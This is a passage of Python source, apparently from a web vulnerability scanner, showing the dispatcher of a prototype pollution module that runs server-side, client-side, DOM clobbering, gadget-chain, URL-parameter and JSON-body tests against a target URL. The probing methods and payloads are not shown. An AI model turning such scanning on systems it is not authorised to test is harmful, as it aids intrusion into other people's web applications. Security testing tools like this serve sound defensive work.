            scan_type: Type of scan to run
                - 'server': Server-side PP detection
                - 'client': Client-side PP detection
                - 'dom_clobber': DOM clobbering detection
                - 'gadgets': Gadget chain finder
                - 'url_params': PP via URL parameters
                - 'json_body': PP via JSON body
                - 'full': Run all PP tests
        Returns:
            dict with 'vulnerable', 'findings', 'details', 'scan_type'
        """
        self._print(f"\n{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  PROTOTYPE POLLUTION ENGINE - v5.0.0{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}  Fused from: pp-finder + DOM-Clobber-Check + Custom{RESET}", CYAN)
        self._print(f"{BOLD}{CYAN}═══════════════════════════════════════════════════{RESET}", CYAN)

        url = target if target.startswith('http') else f"https://{target}"

        scan_map = {
            'server': lambda: self.detect_server_pp(url),
            'client': lambda: self.detect_client_pp(url),
            'dom_clobber': lambda: self.detect_dom_clobber(url),
            'gadgets': lambda: self.find_gadget_chains(url),
            'url_params': lambda: self.test_via_params(url),
            'json_body': lambda: self.test_via_json(url),
        }

        if scan_type == 'full':
            all_findings = []
            all_details = {}
            any_vulnerable = False

            tests = [
                ("Server-Side PP", lambda: self.detect_server_pp(url)),
                ("Client-Side PP", lambda: self.detect_client_pp(url)),
                ("DOM Clobbering", lambda: self.detect_dom_clobber(url)),
                ("Gadget Chains", lambda: self.find_gadget_chains(url)),
                ("PP via URL Params", lambda: self.test_via_params(url)),
                ("PP via JSON Body", lambda: self.test_via_json(url)),
            ]

            for i, (test_name, test_func) in enumerate(tests, 1):
                self._print(f"\n  {BOLD}{YELLOW}[Phase {i}/{len(tests)}] {test_name}{RESET}", YELLOW)
                try:
                    test_result = test_func()
                    if test_result.get('vulnerable'):
                        any_vulnerable = True
                    all_findings.extend(test_result.get('findings', []))
                    all_details[test_name] = test_result.get('details', {})
                except Exception as e:
                    all_details[test_name] = {"error": str(e)}

            return {
                'vulnerable': any_vulnerable,
                'findings': all_findings,
                'details': all_details,
                'scan_type': 'pp_full',
            }

        scan_func = scan_map.get(scan_type)
        if scan_func:
            return scan_func()

        return {
            'vulnerable': False,
            'findings': [],
            'details': {"error": f"Unknown scan type: {scan_type}"},
            'scan_type': scan_type,
        }


# ============================================================================
# MODULE-LEVEL RUN FUNCTION (ZYLON FUSION INTEGRATION)
# ============================================================================

def run(target, scan_type='full', **kwargs):
    """Module-level run function for ZYLON FUSION integration"""
    engine = PrototypeEngine()
    return engine.run(target, scan_type=scan_type, **kwargs)
